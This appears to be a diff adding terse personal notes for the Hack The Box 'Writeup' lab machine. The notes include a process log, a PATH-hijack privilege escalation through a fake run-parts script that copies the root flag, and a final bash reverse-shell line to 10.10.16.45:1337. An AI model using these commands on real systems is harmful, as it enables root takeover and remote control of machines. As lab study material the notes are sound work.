@@ -1,0 +1,66 @@
+MOTD PROGRAM COMMAND RUNNING AS ROOT
+
+019/06/11 06:59:34 CMD: UID=1000 PID=4266   | ls --color=auto 
+2019/06/11 06:59:42 CMD: UID=1000 PID=4267   | ls --color=auto -al 
+2019/06/11 06:59:44 CMD: UID=0    PID=4269   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
+2019/06/11 06:59:44 CMD: UID=0    PID=4268   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
+2019/06/11 06:59:44 CMD: UID=0    PID=4270   | /bin/sh /etc/update-motd.d/10-uname 
+2019/06/11 06:59:44 CMD: UID=1000 PID=4272   | sshd: jkr         
+2019/06/11 06:59:44 CMD: UID=1000 PID=4273   | -bash 
+2019/06/11 06:59:44 CMD: UID=1000 PID=4275   | 
+2019/06/11 06:59:44 CMD: UID=1000 PID=4274   | -bash 
+2019/06/11 06:59:44 CMD: UID=1000 PID=4277   | -bash 
+2019/06/11 06:59:44 CMD: UID=1000 PID=4276   | -bash 
+2019/06/11 06:59:50 CMD: UID=1000 PID=4278   | cat /usr/sbin/cron 
+2019/06/11 06:59:54 CMD: UID=1000 PID=4280   | ls --color=auto 
+2019/06/11 06:59:56 CMD: UID=0    PID=4282   | 
+2019/06/11 07:00:01 CMD: UID=0    PID=4283   | /usr/sbin/cron 
+2019/06/11 07:00:01 CMD: UID=0    PID=4285   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+2019/06/11 07:00:01 CMD: UID=0    PID=4284   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+2019/06/11 07:00:06 CMD: UID=1000 PID=4286   | cat /usr/sbin/perl 
+2019/06/11 07:00:11 CMD: UID=1000 PID=4287   | cat /usr/bin/perl 
+
+
+WRITABLE DIRECTORY
+jkr@writeup:~$ find / -writable -type d 2>/dev/null
+/usr/local/bin
+/usr/local/sbin
+
+TAKE ADVANTAGE OF RUN-PARTS COMMAND IN THE ROOT PROGRAM COMMAND TO PRIV ESC BY PATH PRIORITY
+jkr@writeup:/tmp$ mkdir test
+jkr@writeup:/tmp$ cd test
+jkr@writeup:/tmp/test$ echo "cp /root/root.txt /tmp/test/root.txt" > /usr/local/sbin/run-parts
+jkr@writeup:/tmp/test$ echo "chmod 777 /tmp/test/root.txt" >> /usr/local/sbin/run-parts
+jkr@writeup:/tmp/test$ chmod +x /usr/local/sbin/run-parts
+jkr@writeup:/tmp/test$ ls -a
+.  ..
+
+GENERATE TARFFIC IN ANOTHER TERMINAL
+oot@kali:~/HTB/Writeup# ssh jkr@writeup.htb
+jkr@writeup.htb's password: 
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun 14 11:06:28 2019 from 10.10.15.8
+jkr@writeup:~$ 
+
+CHECK DIR
+jkr@writeup:/tmp/test$ ls -a
+.  ..  root.txt
+jkr@writeup:/tmp/test$ cat root.txt
+eeba47f60b48ef92b734f9b6198d7226
+
+
+
+
+
+echo "cp /root/root.txt /tmp/test/root.txt" > /usr/local/sbin/run-parts
+echo "chmod 777 /tmp/test/root.txt" >> /usr/local/sbin/run-parts
+chmod +x /usr/local/sbin/run-parts
+
+
+echo "bash -i >& /dev/tcp/10.10.16.45/1337 0>&1" > /usr/local/sbin/run-parts
